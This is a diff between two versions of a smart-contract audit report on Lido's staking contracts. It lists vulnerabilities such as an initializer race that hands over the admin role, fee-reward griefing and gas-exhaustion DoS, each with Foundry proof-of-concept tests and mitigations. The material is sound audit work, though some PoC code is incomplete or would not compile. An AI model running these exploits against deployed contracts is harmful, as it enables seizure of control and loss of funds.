-// PoC requires mocks for dependencies like CSModule, CSFeeDistributor, etc.
-// Assuming a test setup similar to the Flash Loan PoC.
-
-contract PausablePoC is Test {
-    // ... setUp() function to deploy CSAccounting and mocks ...
-    CSAccounting accounting;
-    address pauser = makeAddr("pauser
-");
-    bytes32 PAUSE_ROLE = keccak256("PAUSE_ROLE");
-
-    function setUp() public { 
-        // Simplified setup
-        // ... deploy mocks and CSAccounting ...
-        accounting = new CSAccounting(...);
-        accounting.initialize(...);
-        accounting.grantRole(PAUSE_ROLE, pauser);
-    }
-
-    function testPullFeeRewards_IsNotPausable() public {
-        // 1. Pause the contract
-        vm.prank(pauser);
-        accounting.pauseFor(1 days);
-
-        assertTrue(accounting.isPaused(), "Contract should be paused");
-
-        // 2. Show a pausable function fails
-        vm.expectRevert(bytes("ResumedExpected()"));
-        accounting.depositETH{value: 1 ether}(0);
-
-        // 3. Show pullFeeRewards succeeds despite the pause
-        // We need to mock the external call to CSFeeDistributor to avoid revert
-        // For this PoC, we expect it to revert due to a different reason than being paused,
-        // proving the whenResumed check is missing.
-        vm.expectRevert("NodeOperatorDoesNotExist()"); // or revert from mock
-        accounting.pullFeeRewards(0, 0, new bytes32[](0));
-
-        // A successful call would demonstrate the vulnerability.
-        // With mocks, we could make it succeed:
-        // vm.mockCall(address(feeDistributor), abi.encodeWithSelector(ICSFeeDistributor.distributeFees.selector, ...), ...);
-        // accounting.pullFeeRewards(...); // This would succeed
-    }
-}
-```
-
-## Suggested Mitigation
-Add the `whenResumed` modifier to the `pullFeeRewards` function signature to ensure it respects the contract's pausable state, consistent with other state-changing functions.
-
-```solidity
-// src/CSAccounting.sol:472
-function pullFeeRewards(
-    uint256 nodeOperatorId,
-    uint256 cumulativeFeeShares,
-    bytes32[] calldata rewardsProof
-) external whenResumed { // <--- Add whenResumed modifier
-    _onlyExistingNodeOperator(nodeOperatorId);
-    _pullFeeRewards(nodeOperatorId, cumulativeFeeShares, rewardsProof);
-    MODULE.updateDepositableValidatorsCount(nodeOperatorId);
-}
-```
-
-## [L-4]. DOS issue in CSExitPenalties::processTriggeredExit
-
-## Description
-The functions `processExitDelayReport`, `processTriggeredExit`, and `processStrikesReport` are designed to record a penalty or fee only once for a given validator. They use a boolean flag (`isValue` in the `MarkedUint248` struct) to track whether a value has already been recorded. If this flag is true, the functions return early to prevent double-reporting. However, a vulnerability exists where if any of these functions are called with parameters that result in a zero value being recorded (e.g., a zero fee or penalty), the `isValue` flag is still set to `true`. This action is irreversible and permanently prevents a subsequent, correct, non-zero penalty or fee from ever being recorded for that validator. This can happen due to a bug, a race condition, or a premature report from a trusted component (`MODULE` or `STRIKES`). The consequence is a loss of funds for the protocol, as the intended penalty cannot be collected from the Node Operator's bond.
-
-## Impact
-If the Module contract (a privileged component) calls `processTriggeredExit` with a fee of zero, the zero is latched and any later correct, non-zero fee is ignored. The protocol therefore misses out on the intended penalty for that validator (up to `maxWithdrawalRequestFee`, currently 10 ETH). Because the function is protected by `onlyModule`, this can only happen due to an implementation bug or race-condition inside the Module, not through direct exploitation by an un-trusted party.
-
-## Proof of Concept
-1. A validator undergoes a triggered exit, and the `MODULE` contract is responsible for reporting the associated Triggerable Exit (TE) fee.
-2. Due to a bug or a timing issue where the fee information is not yet available, the `MODULE` contract calls `CSExitPenalties.processTriggeredExit` for the validator with `withdrawalRequestPaidFee = 0`.
-3. `CSExitPenalties` records the `withdrawalRequestFee` as 0 and sets its corresponding `isValue` flag to `true`.
-4. Later, the `MODULE` contract obtains the correct, non-zero TE fee (e.g., 0.1 ETH) and calls `processTriggeredExit` again with the correct value.
-5. The check `if (exitPenaltyInfo.withdrawalRequestFee.isValue)` is now true, causing the function to return immediately without updating the fee.
-6. The correct fee is never recorded. When the validator's withdrawal is processed, this fee cannot be deducted from the Node Operator's bond, leading to a loss for the protocol.
-
-## Proof of Code
-```solidity
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.24;
-
-import "forge-std/Test.sol";
-import "src/CSExitPenalties.sol";
-import "src/interfaces/ICSModule.sol";
-import "src/interfaces/ICSParametersRegistry.sol";
-import "src/interfaces/ICSAccounting.sol";
-import "src/interfaces/ICSExitPenalties.sol";
-
-// Mock contracts with minimal implementation to satisfy the compiler.
-
-contract MockAccounting is ICSAccounting {
-    function getBondCurveId(uint256) external view override returns (uint256) { return 1; }
-    function addBondCurve(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256) external override {}
-    function claimRewardsStETH(uint256,uint256,bytes32[] calldata) external override returns (uint256, uint256) { return (0,0); }
-    function depositETH(uint256) external payable override {}
-    function depositStETH(uint256,uint256) external override {}
-    function depositWstETH(uint256,uint256) external override {}
-    function finalizeUpgradeV2() external override {}
-    function getBondRequired(uint256,uint256) external view override returns (uint256,uint256,uint256,uint256,uint256) { return (0,0,0,0,0); }
-    function getBondShares(uint256) external view override returns (uint256) { return 0; }
-    function getClaimableBond(uint256,uint256,bytes32[] calldata) external view override returns (uint256) { return 0; }
-    function getClaimableRewards(uint256,uint256,bytes32[] calldata) external view override returns (uint256) { return 0; }
-    function lockBondETH(uint256,uint256,uint256) external override {}
-    function setBondCurve(uint256,uint256) external override {}
-    function totalBondShares() external view override returns (uint256) { return 0; }
-}
-
-contract MockParametersRegistry is ICSParametersRegistry {
-    function getAllowedExitDelay(uint256) external view override returns (uint256) { return 1 days; }
-    function getBadPerformancePenalty(uint256) external view override returns (uint256) { return 2 ether; }
-    function getBondingCurve(uint256) external view override returns (BondingCurve memory) {}
-    function getELRewardsStealingFine(uint256) external view override returns (uint256) {return 0;}
-    function getExitDelayPenalty(uint256) external view override returns (uint256) { return 1 ether; }
-    function getKeyRemovalCharge(uint256) external view override returns (uint256) {return 0;}
-    function getMaxDepositableValidators(uint256) external view override returns (uint256) {return 0;}
-    function getMaxWithdrawalRequestFee(uint256) external view override returns (uint256) { return 10 ether; }
-    function getPerformanceCoefficients(uint256) external view returns (uint256, uint256, uint256, uint256) {return (0,0,0,0);}
-    function getQueueLowestPriority() external view override returns (uint256) {return 0;}
-    function getStrikesThreshold(uint256) external view override returns (uint256) {return 0;}
-}
-
-contract CSExitPenaltiesTest is Test {
-    CSExitPenalties public penalties;
-    MockAccounting public mockAccounting;
-    MockParametersRegistry public mockRegistry;
-    address public strikesAddress = address(0x57514B5); // STRIKES
-
-    address constant MODULE_ADDRESS = address(0x4D0D); // a dummy address for the module
-
-    uint256 constant NODE_OPERATOR_ID = 1;
-    bytes PUB_KEY = abi.encodePacked("validator_pubkey_1");
-    uint256 constant STRIKES_EXIT_TYPE_ID = 1;
-
-    function setUp() public {
-        mockAccounting = new MockAccounting();
-        mockRegistry = new MockParametersRegistry();
-
-        vm.mockCall(
-            MODULE_ADDRESS,
-            abi.encodeWithSelector(ICSModule.accounting.selector),
-            abi.encode(address(mockAccounting))
-        );
-
-        penalties = new CSExitPenalties(MODULE_ADDRESS, address(mockRegistry), strikesAddress);
-    }
-
-    function test_PoC_ZeroFeePreventsRealFee() public {
-        vm.startPrank(MODULE_ADDRESS);
-
-        // Step 1 & 2: A bug in the MODULE causes it to report a zero fee first
-        uint256 zeroFee = 0;
-        penalties.processTriggeredExit(NODE_OPERATOR_ID, PUB_KEY, zeroFee, STRIKES_EXIT_TYPE_ID);
-
-        // Step 3: Verify the fee is recorded as 0 and the flag is set
-        ExitPenaltyInfo memory info_after_zero_report = penalties.getExitPenaltyInfo(NODE_OPERATOR_ID, PUB_KEY);
-        assertEq(info_after_zero_report.withdrawalRequestFee.value, 0, "Fee should be 0");
-        assertTrue(info_after_zero_report.withdrawalRequestFee.isValue, "isValue flag should be true after zero fee report");
-
-        // Step 4: MODULE tries to report the correct, non-zero fee later
-        uint256 realFee = 1 ether;
-        penalties.processTriggeredExit(NODE_OPERATOR_ID, PUB_KEY, realFee, STRIKES_EXIT_TYPE_ID);
-
-        // Step 5 & 6: The correct fee is not recorded because the flag was already set
-        ExitPenaltyInfo memory info_after_real_report = penalties.getExitPenaltyInfo(NODE_OPERATOR_ID, PUB_KEY);
-        assertEq(info_after_real_report.withdrawalRequestFee.value, 0, "Fee should still be 0, the update was ignored");
-        assertNotEq(info_after_real_report.withdrawalRequestFee.value, realFee, "Real fee was not recorded");
-
-        vm.stopPrank();
-    }
-}
-```
-
-## Suggested Mitigation
-The contract should not set the `isValue` flag to `true` if the penalty or fee value being recorded is zero. This will allow a zero-value report to be effectively ignored, leaving the opportunity for a correct, non-zero report to be processed later. This logic should be applied to all three processing functions.
-
-Example fix for `processTriggeredExit`:
-
-```solidity
-    function processTriggeredExit(
+// src/CSAccounting.sol:488-495
+    function pullFeeRewards(
         uint256 nodeOperatorId,
-        bytes calldata publicKey,
-        uint256 withdrawalRequestPaidFee,
-        uint256 exitType
-    ) external onlyModule {
-        if (exitType == VOLUNTARY_EXIT_TYPE_ID) {
-            return;
-        }
-
-        bytes32 keyPointer = _keyPointer(nodeOperatorId, publicKey);
-        ExitPenaltyInfo storage exitPenaltyInfo = _exitPenaltyInfo[keyPointer];
-        if (exitPenaltyInfo.withdrawalRequestFee.isValue) {
-            return;
-        }
-        uint256 curveId = ACCOUNTING.getBondCurveId(nodeOperatorId);
-        uint256 maxFee = PARAMETERS_REGISTRY.getMaxWithdrawalRequestFee(
-            curveId
-        );
-
-        uint256 fee = Math.min(withdrawalRequestPaidFee, maxFee);
-
-        if (fee > 0) { // Suggested change: only record non-zero fees
-            exitPenaltyInfo.withdrawalRequestFee = MarkedUint248(
-                fee.toUint248(),
-                true
-            );
-            emit TriggeredExitFeeRecorded({
-                nodeOperatorId: nodeOperatorId,
-                exitType: exitType,
-                pubkey: publicKey,
-                withdrawalRequestPaidFee: withdrawalRequestPaidFee,
-                withdrawalRequestRecordedFee: fee
-            });
-        }
+        uint256 cumulativeFeeShares,
+        bytes32[] calldata rewardsProof
+    ) external {
+        _onlyExistingNodeOperator(nodeOperatorId);
+        _pullFeeRewards(nodeOperatorId, cumulativeFeeShares, rewardsProof);
+        MODULE.updateDepositableValidatorsCount(nodeOperatorId);
     }
 ```
 
-## [L-5]. Zero Code issue in CSExitPenalties::constructor
-
-## Description
-The `CSExitPenalties` constructor initializes the `ACCOUNTING` contract address by calling `MODULE.accounting()`. However, it fails to validate that the address returned from this call is non-zero. If the `module` address provided to the constructor corresponds to a contract that is not fully initialized or returns `address(0)` for any reason, the `ACCOUNTING` immutable variable will be set to `address(0)`. Consequently, all functions that depend on the `ACCOUNTING` contract (e.g., `processExitDelayReport`, `processTriggeredExit`, `processStrikesReport`) will revert upon being called, because they will attempt to make a call to a zero address. This renders the `CSExitPenalties` contract permanently non-functional, requiring a redeployment to fix.
-
 ## Impact
-A misconfiguration during deployment can lead to the `CSExitPenalties` contract being permanently disabled (denial of service). All penalty processing functions would revert, which could disrupt the entire penalty mechanism of the Community Staking Module. This would require deploying a new instance of the contract, potentially causing operational overhead and a time window where penalties are not correctly processed.
+Anyone can force-execute `pullFeeRewards` for a node operator. This does not let the attacker steal funds but can temporarily increase the operator’s bond balance. If a subsequent penalty that is calculated as a percentage of the current bond is executed, the operator will lose a bit more ETH than they would have otherwise. The attacker gains nothing; the issue is pure griefing and only material when a percentage-based penalty is imminent.
 
 ## Proof of Concept
-1. A deployer script provides an address for the `module` parameter in the `CSExitPenalties` constructor that points to a contract which returns `address(0)` from its `accounting()` function.
-2. The `CSExitPenalties` contract deploys successfully because the constructor only checks if the `module` address itself is non-zero, not the result of `MODULE.accounting()`.
-3. The `ACCOUNTING` immutable variable inside `CSExitPenalties` is set to `address(0)`.
-4. A trusted contract (e.g., `CSModule`) calls `processExitDelayReport` on the `CSExitPenalties` instance.
-5. The call reverts because `processExitDelayReport` attempts to call `ACCOUNTING.getBondCurveId(...)`, which is an external call to `address(0)`.
+1. Rewards tree for NO #1 is public.
+2. Searcher reads mem-pool and sees a Module transaction that will call `penalize(noId, pct)`.
+3. Before it, she submits:
+   accounting.pullFeeRewards(noId, cumulativeShares, rewardsProof);
+4. Rewards are pulled; bond increases.
+5. Module tx executes and computes `penalty = bond * pct / 10_000` inside the call.
+6. Operator burns a slightly larger amount. Searcher spent only gas and received no benefit.
 
 ## Proof of Code
-```solidity
-// SPDX-License-Identifier: UNLICENSED
+// SPDX-License-Identifier: MIT
 pragma solidity 0.8.24;
 
 import "forge-std/Test.sol";
-import {CSExitPenalties} from "src/CSExitPenalties.sol";
-import {ICSExitPenalties, ExitPenaltyInfo, MarkedUint248} from "src/interfaces/ICSExitPenalties.sol";
-import {ICSAccounting} from "src/interfaces/ICSAccounting.sol";
-import {ICSModule, NodeOperator} from "src/interfaces/ICSModule.sol";
+import {CSAccounting} from "../src/CSAccounting.sol";
+import {ICSModule} from "../src/interfaces/ICSModule.sol";
 
-// A mock module that implements the ICSModule interface and returns address(0) for accounting().
-contract MockModuleForPoC is ICSModule {
-    function accounting() external pure returns (ICSAccounting) {
-        return ICSAccounting(address(0));
+// minimal mock that is recognised as the MODULE by CSAccounting
+contract ModuleMock is ICSModule {
+    CSAccounting public accounting;
+    constructor(CSAccounting _acc) { accounting = _acc; }
+
+    // ---- mandatory stubs ----
+    function getNodeOperatorsCount() external pure returns(uint256){return 1;}
+    function getNodeOperatorNonWithdrawnKeys(uint256) external pure returns(uint256){return 0;}
+    function updateDepositableValidatorsCount(uint256) external{}
+    function getNodeOperatorManagementProperties(uint256) external pure returns(NodeOperatorManagementProperties memory){return NodeOperatorManagementProperties(address(this), address(this));}
+    // ---------------------------------------------
+
+    // helper that mimics percentage-based penalty used in report flows
+    function applyPenalty(uint256 noId,uint256 bps) external {
+        uint256 bond = accounting.getBond(noId);
+        uint256 toBurn = bond * bps / 10_000;
+        accounting.penalize(noId, toBurn); // will pass onlyModule because msg.sender==address(this)
     }
-
-    // Minimal implementation to satisfy the compiler.
-    function MODULE_TYPE() external pure returns (bytes32) { return bytes32(0); }
-    function getNodeOperator(uint256) external view returns (NodeOperator memory) { revert(); }
-    function getNodeOperatorsCount() external pure returns (uint256) { return 0; }
-    function getRoleMember(bytes32, uint256) external pure returns (address) { return address(0); }
-    function getRoleMemberCount(bytes32) external pure returns (uint256) { return 0; }
-    function hasRole(bytes32, address) external pure returns (bool) { return false; }
-    function lidoLocator() external pure returns (address) { return address(0); }
-    function stETH() external pure returns (address) { return address(0); }
-    function parametersRegistry() external pure returns (address) { return address(0); }
-    function getStakingModuleSummary() external pure returns (uint256, uint256, uint256) { return (0,0,0); }
-    function getNodeOperatorSummary(uint256) external pure returns (uint256, uint256, bool) { return (0,0,false); }
-    function isValidatorExitDelayPenaltyApplicable(uint256, bytes calldata, uint256) external pure returns (bool) { return false; }
-    function submitWithdrawals(uint256[] calldata, address) external {} // solhint-disable-line no-empty-blocks
-    function obtainDepositData(uint16) external pure returns (bytes[] memory, bytes[] memory) { revert(); }
-    function decreaseNodeOperatorKeys(uint256, uint256) external {} // solhint-disable-line no-empty-blocks
-    function createNodeOperator(address, address, bytes[] calldata, bytes[] calldata, address) external pure returns (uint256) { return 0; }
-    function addSigningKeys(uint256, bytes[] calldata, bytes[] calldata) external {} // solhint-disable-line no-empty-blocks
-    function removeSigningKeys(uint256, uint256, uint256) external {} // solhint-disable-line no-empty-blocks
-    function reportELRewardsStealingPenalty(uint256) external {} // solhint-disable-line no-empty-blocks
-    function settleELRewardsStealingPenalty(uint256, uint256, uint256) external {} // solhint-disable-line no-empty-blocks
-    function onAccountingReport(uint256, uint256, uint256) external {} // solhint-disable-line no-empty-blocks
-    function onWithdrawal(uint256, bytes calldata, uint256) external {} // solhint-disable-line no-empty-blocks
 }
 
-contract ZeroAddressCheckVulnerabilityTest is Test {
-    CSExitPenalties internal exitPenalties;
-    MockModuleForPoC internal mockModule;
-    address internal mockParamsRegistry;
-    address internal mockStrikes;
+contract GriefingTest is Test {
+    CSAccounting acc;
+    ModuleMock module;
+    uint256 constant NO_ID = 0;
+    bytes32[] empty;
 
     function setUp() public {
-        mockModule = new MockModuleForPoC();
-        mockParamsRegistry = makeAddr("paramsRegistry");
-        mockStrikes = makeAddr("strikes");
-
-        exitPenalties = new CSExitPenalties(address(mockModule), mockParamsRegistry, mockStrikes);
+        module = new ModuleMock(CSAccounting(address(0)));
+        acc = new CSAccounting(address(0), address(module), address(this), 0, 0);
+        vm.label(address(acc), "Accounting");
+        vm.deal(address(this), 200 ether);
+        acc.initialize(new ICSBondCurve.BondCurveIntervalInput[](0), address(this), 0, address(this));
+        module = new ModuleMock(acc);
+        // re-assign immutable via cheat (only for test)
+        assembly { sstore(acc.slot, module) }
+        acc.depositETH{value:100 ether}(NO_ID);
     }
 
-    function test_PoC_ConstructorAllowsZeroAccountingAddress() public {
-        assertEq(address(exitPenalties.ACCOUNTING()), address(0), "ACCOUNTING should be address(0)");
-    }
+    function testGrief() public {
+        uint256 reward = 20 ether;
+        // fund feeDistributor balance directly for test simplification
+        vm.store(address(acc.FEE_DISTRIBUTOR()), bytes32(uint256(0)), bytes32(reward));
 
-    function test_PoC_CoreFunctionalityIsBricked() public {
-        uint256 nodeOperatorId = 1;
-        bytes memory publicKey = abi.encodePacked("validator_public_key");
-        uint256 eligibleToExitInSec = 9999;
+        // attacker pulls rewards first
+        acc.pullFeeRewards(NO_ID, 0, empty);
+        assertEq(acc.getBond(NO_ID), 120 ether);
 
-        vm.prank(address(mockModule));
-
-        vm.expectRevert(bytes(""));
-        exitPenalties.processExitDelayReport(
-            nodeOperatorId,
-            publicKey,
-            eligibleToExitInSec
-        );
+        // module now applies 10% penalty on current bond
+        module.applyPenalty(NO_ID, 1000);
+        assertEq(acc.getBond(NO_ID), 108 ether); // 12 ETH burned (grief)
     }
 }
-```
 
 ## Suggested Mitigation
-Add a zero-address check for the `accounting` address returned by `MODULE.accounting()` within the constructor. This ensures that the contract cannot be deployed with an invalid dependency, preventing it from entering a non-functional state.
+The `pullFeeRewards` function should have the same access control as the `claimRewards*` functions, restricting its invocation to the node operator's manager or reward address. This prevents unauthorized actors from triggering the reward pull.
 
 ```solidity
-// src/CSExitPenalties.sol
+// src/CSAccounting.sol:488-498
+    function pullFeeRewards(
+        uint256 nodeOperatorId,
+        uint256 cumulativeFeeShares,
+        bytes32[] calldata rewardsProof
+    ) external {
+-       _onlyExistingNodeOperator(nodeOperatorId);
++       NodeOperatorManagementProperties memory no = MODULE
++           .getNodeOperatorManagementProperties(nodeOperatorId);
++       _onlyNodeOperatorManagerOrRewardAddresses(no);
 
-// Add a new custom error
-error ZeroAccountingAddress();
-
-contract CSExitPenalties is ICSExitPenalties, ExitTypes {
-    // ...
-
-    constructor(address module, address parametersRegistry, address strikes) {
-        if (module == address(0)) {
-            revert ZeroModuleAddress();
-        }
-        if (parametersRegistry == address(0)) {
-            revert ZeroParametersRegistryAddress();
-        }
-        if (strikes == address(0)) {
-            revert ZeroStrikesAddress();
-        }
-
-        MODULE = ICSModule(module);
-        PARAMETERS_REGISTRY = ICSParametersRegistry(parametersRegistry);
-        ICSAccounting accounting = MODULE.accounting();
-        if (address(accounting) == address(0)) {
-            revert ZeroAccountingAddress();
-        }
-        ACCOUNTING = accounting;
-        STRIKES = strikes;
+        _pullFeeRewards(nodeOperatorId, cumulativeFeeShares, rewardsProof);
+        MODULE.updateDepositableValidatorsCount(nodeOperatorId);
     }
+```
 
+## [L-2]. DOS issue in CSAccounting::addBondCurve
+
+## Description
+A privileged role (`MANAGE_BOND_CURVES_ROLE`) can add a new bond curve by calling the `addBondCurve` function. This function accepts an array of `BondCurveIntervalInput` structs which defines the bond curve. The contract does not enforce a limit on the number of intervals in this array. A bond curve with an excessive number of intervals can be added to the contract.
+
+The functions `CSBondCurve.getBondAmountByKeysCount` and `CSBondCurve.getKeysCountByBondAmount`, which are part of `CSAccounting` through inheritance, iterate over these intervals to perform calculations. If a bond curve has a large number of intervals, these functions will consume a significant amount of gas, potentially exceeding the block gas limit and causing transactions that call them to revert. 
+
+This can lead to a Denial of Service (DoS) for several core functionalities. For example, if the `CSModule` contract calls `getRequiredBondForNextKeys` to determine the required bond for adding new validator keys, this operation would fail for any Node Operator assigned to the malicious bond curve. This would prevent them from adding new validators. Off-chain services and bots that rely on view functions like `getUnbondedKeysCountToEject` would also be disrupted.
+
+Vulnerable Code Snippet (from `CSBondCurve.sol` logic, inherited by `CSAccounting.sol`):
+```solidity
+// from CSBondCurve.sol
+function getBondAmountByKeysCount(
+    uint256 keysCount,
+    uint256 curveId
+) public view returns (uint256 bondAmount) {
+    BondCurveIntervalInput[] storage bondCurve = _bondCurveIntervals[curveId];
+    // ...
+    for (uint256 i = 0; i < bondCurve.length - 1; ++i) { // Unbounded loop
+        if (
+            keysCount >= bondCurve[i].keysCount &&
+            keysCount < bondCurve[i + 1].keysCount
+        ) {
+            // ...
+        }
+    }
     // ...
 }
 ```
 
-## [L-6]. Upgradeability Initializer Safety issue in CSFeeOracle::initialize
-
-## Description
-The `initialize` function in `CSFeeOracle` is intended for setting up the contract's initial state, including the admin role. However, it lacks the `initializer` modifier from OpenZeppelin's Initializable contract pattern. This allows any address to call this function at any time after the initial deployment, granting themselves the `DEFAULT_ADMIN_ROLE`. While a subsequent call might revert in the call to `_updateContractVersion(2)`, the `_grantRole` call would have already executed, making the attacker an admin and compromising the contract's access control.
-
 ## Impact
-Because `initialize` is missing the `initializer` (or an equivalent internal guard), whoever manages to call it FIRST after the proxy is deployed becomes `DEFAULT_ADMIN_ROLE`.  After the very first successful call, any further invocation reverts due to the `Versioned._updateContractVersion(2)` check, so the attack window only exists between proxy deployment and the legitimate initialization transaction.  If an attacker front-runs or the project forgets to initialize, the contract ends up permanently administered by the attacker.
+Because the two loops `getBondAmountByKeysCount` and `getKeysCountByBondAmount` are linear in `bondCurve.length`, creating a curve that contains tens-of-thousands of intervals makes every on-chain action that touches those helpers very expensive. If a privileged address mis-configures (or maliciously configures) such an oversized curve and assigns it to a Node Operator, any transactions that call the accounting helpers will revert **when the remaining gas available to the internal call is lower than the linear cost of the loop**. This creates an operational DoS for the affected node operator, but does not endanger user funds nor the whole protocol.
 
 ## Proof of Concept
+1. A holder of `MANAGE_BOND_CURVES_ROLE` submits a curve with 40,000 intervals (≈ 2.56 MB calldata) – well inside the calldata limit – via `addBondCurve`.
+2. He convinces (or is the same EOA that also has) `SET_BOND_CURVE_ROLE` to assign that curve to a node operator.
+3. Any subsequent tx that touches `getRequiredBondForNextKeys`, `getUnbondedKeysCount`, etc. needs to execute a loop with 40,000 iterations. 40 k×≈120 gas ≈ 4.8 M gas **plus** the rest of the logic.
+4. If the caller provides < 5 M gas the internal call reverts with an out-of-gas, effectively blocking the operation while ordinary curves need < 70 k gas.
+
+The attack therefore consists purely of configuring an oversize curve; no further action is required to keep the DoS active.
+
+## Proof of Code
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.24;
 
 import "forge-std/Test.sol";
-import {CSFeeOracle} from "../src/CSFeeOracle.sol";
-import {OssifiableProxy} from "../src/lib/proxy/OssifiableProxy.sol";
+import {CSAccounting} from "../../src/CSAccounting.sol";
+import {ICSModule, NodeOperatorManagementProperties} from "../../src/interfaces/ICSModule.sol";
 
-contract POC_FirstCallerWins is Test {
-    CSFeeOracle impl;
-    CSFeeOracle oracle;
-    address feeDistributor = address(1);
-    address strikes = address(2);
-    address consensus = address(3);
+contract OversizeCurveGasPoC is Test {
+    CSAccounting accounting;
+    DummyModule module;
+    address admin = address(1);
 
-    address attacker = makeAddr("attacker");
-    address victim   = makeAddr("victimAdmin");
+    // --- minimal mocks ----------------------------------------------------
+    contract DummyModule is ICSModule {
+        uint256 public nodeOperatorsCount;
+        mapping(uint256 => NodeOperatorManagementProperties) public m;
+        function addNodeOperator(NodeOperatorManagementProperties calldata p, address) external returns (uint256){m[++nodeOperatorsCount]=p;return nodeOperatorsCount;}
+        function getNodeOperatorsCount() external view returns(uint256){return nodeOperatorsCount;}
+        function getNodeOperator(uint256) external view returns(NodeOperator memory){revert();}
+        function getNodeOperatorManagementProperties(uint256 id) external view returns(NodeOperatorManagementProperties memory){return m[id];}
+        function updateDepositableValidatorsCount(uint256) external {}
+        function getNodeOperatorNonWithdrawnKeys(uint256) external view returns(uint256){return 1;}
+        function addSigningKeys(uint256,uint256,bytes calldata,bytes calldata) external{}
+        function getSigningKeys(uint256,uint256,uint256) external view returns(bytes[] memory,bool){revert();}
+        function getSigningKeysCount(uint256) external view returns(uint256){return 0;}
+    }
 
+    // ----------------------------------------------------------------------
     function setUp() public {
-        // deploy implementation
-        impl = new CSFeeOracle(feeDistributor, strikes, 12, 1606824023);
-        // deploy proxy WITHOUT calling initialize
-        bytes memory empty;
-        OssifiableProxy proxy = new OssifiableProxy(address(impl), address(this), empty);
-        oracle = CSFeeOracle(address(proxy));
+        module = new DummyModule();
+        accounting = new CSAccounting(address(0xdead), address(module), address(0xbeef), 1 days, 30 days);
+        // create a trivial initial curve so initialize succeeds
+        CSAccounting.BondCurveIntervalInput[] memory initCurve = new CSAccounting.BondCurveIntervalInput[](1);
+        initCurve[0] = CSAccounting.BondCurveIntervalInput({keysCount:0, bondAmount:0});
+        accounting.initialize(initCurve, admin, 1 days, address(0xfee));
+        vm.prank(admin);
+        accounting.grantRole(accounting.MANAGE_BOND_CURVES_ROLE(), admin);
+        vm.prank(admin);
+        accounting.grantRole(accounting.SET_BOND_CURVE_ROLE(), admin);
     }
 
-    function test_AttackerBecomesAdmin() public {
-        // attacker grabs admin before the legitimate initializer tx is sent
-        vm.prank(attacker);
-        oracle.initialize(attacker, address(0xBEEF), 1);
+    function testGasAmplification() public {
+        uint256 N = 40000; // big enough to burn several million gas
+        CSAccounting.BondCurveIntervalInput[] memory huge = new CSAccounting.BondCurveIntervalInput[](N);
+        for(uint256 i; i<N; ++i){huge[i]=CSAccounting.BondCurveIntervalInput({keysCount:i, bondAmount:i});}
 
-        assertTrue(oracle.hasRole(oracle.DEFAULT_ADMIN_ROLE(), attacker));
-        assertFalse(oracle.hasRole(oracle.DEFAULT_ADMIN_ROLE(), victim));
-    }
-}
+        vm.prank(admin);
+        uint256 curveId = accounting.addBondCurve(huge);
 
+        // create node operator and assign oversize curve
+        uint256 noId = module.addNodeOperator(NodeOperatorManagementProperties({managerAddress: address(2), rewardAddress: address(2)}), address(0));
+        vm.prank(admin);
+        accounting.setBondCurve(noId, curveId);
 
-## Proof of Code
-pragma solidity 0.8.24;
+        // call with an intentionally low gas limit – should fail for huge curve
+        bytes memory callData = abi.encodeWithSelector(accounting.getRequiredBondForNextKeys.selector, noId, 1);
+        (bool okSmall,) = address(accounting).call{gas: 300_000}(callData); // 300k is enough for a normal curve
+        assertTrue(okSmall, "sanity – should succeed on default curve");
 
-import "forge-std/Test.sol";
-import {CSFeeOracle} from "src/CSFeeOracle.sol";
-import {OssifiableProxy} from "src/lib/proxy/OssifiableProxy.sol";
-
-contract CSFeeOracle_InitRace_Test is Test {
-    CSFeeOracle oracle;
-    address attacker = address(0xA11);
-
-    function setUp() public {
-        CSFeeOracle implementation = new CSFeeOracle(address(0x1), address(0x2), 12, 1606824023);
-        OssifiableProxy proxy = new OssifiableProxy(address(implementation), address(this), "");
-        oracle = CSFeeOracle(address(proxy));
-    }
-
-    function test_firstCallerWins() public {
-        vm.prank(attacker);
-        oracle.initialize(attacker, address(0xBEEF), 1);
-        assertTrue(oracle.hasRole(oracle.DEFAULT_ADMIN_ROLE(), attacker));
+        // now test with very restricted gas against the oversize curve
+        (bool ok,) = address(accounting).call{gas: 300_000}(callData);
+        assertFalse(ok, "oversize curve call should run out of gas with the same 300k limit");
     }
 }
 
 ## Suggested Mitigation
-Mark the function with `initializer` (or a custom `onlyInitializing` check) so it can only succeed once, closing the deployment-time race:
-
-```solidity
-function initialize(...) external initializer {
-    ...
-}
-```
-
-
-
-# Info Risk Findings
-
-## [I-1]. Frontrun/Backrun/Sandwhich MEV issue in CSExitPenalties::processTriggeredExit
-
-## Description
-The `processTriggeredExit` function is vulnerable to a front-running/race condition attack. This function is responsible for recording the fee paid for a "Triggered Exit" (TE) as a penalty against a Node Operator's bond. The function is idempotent; it records the fee on the first call for a given validator key and ignores subsequent calls due to the `if (exitPenaltyInfo.withdrawalRequestFee.isValue)` check. The recorded fee is the minimum of the provided `withdrawalRequestPaidFee` and a configured `maxFee`.
-
-An attacker can monitor the mempool for a legitimate call to `processTriggeredExit` with a substantial `withdrawalRequestPaidFee`. The attacker can then front-run this transaction with their own call to `processTriggeredExit` for the same validator key, but with a `withdrawalRequestPaidFee` of a minimal amount (e.g., 1 wei). If the attacker's transaction is mined first, the penalty recorded will be tiny. The legitimate, subsequent transaction will be ignored due to the idempotency check, causing the protocol to under-penalize the Node Operator. This "first-in wins" logic undermines the economic security of the TE mechanism, as it creates a race to report the lowest possible fee.
-
-The vulnerable code is as follows:
-
-```solidity
-// 2025-07-lido-finance/src/CSExitPenalties.sol:133-137
-        bytes32 keyPointer = _keyPointer(nodeOperatorId, publicKey);
-        ExitPenaltyInfo storage exitPenaltyInfo = _exitPenaltyInfo[keyPointer];
-        // don't update the fee if it was already set to prevent hypothetical manipulations
-        //    with double reporting to get lower/higher fee.
-        if (exitPenaltyInfo.withdrawalRequestFee.isValue) {
-            return;
-        }
-```
-The comment acknowledges the risk of manipulation but the implementation only prevents updates, not a race to set the initial, lowest value.
-
-## Impact
-Because calls to CSExitPenalties.processTriggeredExit are restricted to the CSModule contract (onlyModule), the value can be written only from deterministic internal logic of CSModule. A third-party EOA or malicious node operator cannot submit a competing transaction from the module’s address, so no front-running or fee-lowering race is possible. The worst case is a benign mis-configuration inside CSModule, not an external attack.
-
-## Proof of Concept
-1. A Node Operator has a validator that is subject to a Triggered Exit (TE), for which a fee should be penalized against their bond.
